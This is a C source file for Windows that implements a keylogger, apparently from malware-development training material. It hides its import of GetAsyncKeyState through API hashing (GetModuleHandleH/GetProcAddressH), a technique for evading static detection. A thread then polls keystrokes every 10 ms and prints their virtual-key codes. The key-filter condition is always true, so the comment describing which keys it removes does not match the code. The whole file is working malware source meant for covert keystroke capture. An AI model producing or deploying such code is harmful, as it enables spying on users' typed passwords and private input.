#include "header.h"

VOID KeyboardClicksLogger() {
    SHORT               state               = NULL;
    HMODULE		        hUser32Module	    = NULL;
    fnGetAsyncKeyState  pGetAsyncKeyState   = NULL;

	// Load User32.dll to the current process so that GetModuleHandleH will work
	if (LoadLibraryA("USER32.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return;
	}

	// Getting the handle of user32.dll using GetModuleHandleH
	hUser32Module = GetModuleHandleH( [["USER32.DLL"]] );
	if (hUser32Module == NULL){
		printf("[!] Couldn't Get Handle To User32.dll \n");
		return;
	}

    // Getting the address of GetAsyncKeyState function using GetProcAddressH
    pGetAsyncKeyState = (fnGetAsyncKeyState)GetProcAddressH(hUser32Module, [["GetAsyncKeyState"]] );
    if (pGetAsyncKeyState == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
        return;
    }

    printf("[*] Output: ");

	while (TRUE) {
        // Sleep for better performance
        // We dont need to query every clock cycle so lets sleep for 10 milliseconds
        Sleep(10);
        
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Range from 0x01-0xFE
		for (int i = 1; i < 255; i++) {
            // Get state
            state = pGetAsyncKeyState(i);
			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            // 1        = press
            // -32767   = held down
            if (state == 1 || state == -32767) {
                // Remove mouse inputs (0x01-0x07), fn keys (0x70-0x8F)
                if (( 7 < i) && ( 120 < i || i < 143))
				    printf("\\x%02X", i);
            }
		}
	}
    
    return;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    return 0;
}